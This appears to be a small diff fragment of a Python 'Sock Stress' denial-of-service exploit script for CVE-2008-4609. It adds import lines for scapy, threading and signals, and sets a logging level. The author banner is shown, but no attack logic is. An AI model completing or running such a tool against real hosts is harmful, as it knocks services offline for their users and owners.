@@ -8,6 +8,15 @@
 # Tested on: Kali Linux x64
 # CVE : CVE-2008-4609
 
+from scapy.all import *
+from time import sleep
+import thread
+import logging
+import os
+import signal
+import sys
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
 print "\n*******************************************************"
 print "**  Python Sock Stress DoS                           **"
 print "**  by H@ck1tHu7ch (Justin Hutchens)                 **"
